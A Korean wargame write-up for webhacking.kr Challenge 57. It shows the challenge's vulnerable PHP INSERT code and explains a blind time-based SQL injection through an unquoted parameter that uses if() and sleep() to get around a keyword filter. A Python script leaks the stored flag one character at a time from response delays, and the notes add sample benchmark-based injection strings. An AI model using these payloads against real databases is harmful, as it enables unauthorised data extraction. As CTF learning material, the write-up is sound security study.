# 문제

- 소스

  ```php
  <?php
    include "../../config.php";
    include "./flag.php";
    if($_GET['view_source']) view_source();
  ?><html>
  <head>
  <title>Challenge 57</title>
  </head>
  <body>
  <?php
    $db = dbconnect();
    if($_GET['msg'] && isset($_GET['se'])){
      $_GET['msg'] = addslashes($_GET['msg']);
      $_GET['se'] = addslashes($_GET['se']);
      if(preg_match("/select|and|or|not|&|\||benchmark/i",$_GET['se'])) exit("Access Denied");
      mysqli_query($db,"insert into chall57(id,msg,pw,op) values('{$_SESSION['id']}','{$_GET['msg']}','{$flag}',{$_GET['se']})");
      echo "Done<br><br>";
      if(rand(0,100) == 1) mysqli_query($db,"delete from chall57");
    }
  ?>
  <form method=get action=index.php>
  <table border=0>
  <tr><td>message</td><td><input name=msg size=50 maxlength=50></td></tr>
  <tr><td>secret</td><td><input type=radio name=se value=1 checked>yes<br><br><input type=radio name=se value=0>no</td></tr>
  <tr><td colspan=2 align=center><input type=submit></td></tr>
  </table>
  </form>
  <br><br><a href=./?view_source=1>view-source</a>
  </body>
  </html>
  ```

- msg를 입력받고 secure 옵션이 있다.

  - 둘 다 get 파라미터로 넘어간다

- msg는 싱글쿼터로 막혀있지만

  - secure는 인젝션 가능하다.




#  풀이

- `benchmark`가 필터링 된것을 보니 타이밍 인젝션임을 예측할 수 있다.

- 필터링

  - and가 막혀있으므로 if
  - 그외엔 필요없다.

- insert될 때 flag가 같이 저장되므로, 그값을 substr로 비교하면서 플래그값을 찾으면 되겠다.

- 파이썬 코딩

  ```python
  while True:
      flag_find = 0
      for ch in range(256):
          se = 'if(substr(pw, {0}, 1)={1}, sleep(3), 222)'.format(len(flags)+1, hex(ch))
          url = 'https://webhacking.kr/'
          params = {'msg': '123123', 'se': se}
          print params['se']
          start = time.time()
          res = requests.get(url+page, params=params,  cookies=cookies)
          end = time.time()
          ch = chr(ch)
          if end - start > 2:
              print 'founded!!'
              print 'chr: ' + ch
              print 'current: ' + flags
              flags += ch
              flag_find = 1
              break
  
      if flag_find == 0:
          break
  
  print 'founded flags successfully...'
  print 'flags: ' + flags
  
  ```

  



# 알게된 것

### BenchMark in sql

- timing sql injection시 사용한다.
- m함수를 n번 실행할 수 있다.
- 예시
  - `benchmark(1000000, md5('1'))`
    - md5를 1000000만큼 실행
- sql injection 예시
  - `123' or substr(id, 0, 1)='a' and benchmark(1000000, md5('1'))`

### IF문 in sql

- 예시
  - ` insert into myTable values(if(no=123,'female','male'), 121212);`
  - 참이면 female, 거짓이면 male
- timing 인젝션시 and가 막혔을 때 우회할 수 있다.



### 시간측정 in python

- `time.time`

  - 현재 시간 카운트값을 반환해준다.

- 실사용 예

  ```python
  import time
  start = time.time()  # 시작 시간 저장
   
  # 작업 코드
   
  print("time :", time.time() - start)  # 현재시각 - 시작시간 = 실행 시간
  ```

### requests in python

- get 파라미터 전달시 주의사항
  - 파라미터는 requests의 인자로 전달해야 한다.(url 인코딩 문제때문인듯)
  - 예시
    - `requests.get(url, params=param, cookies=cookies)`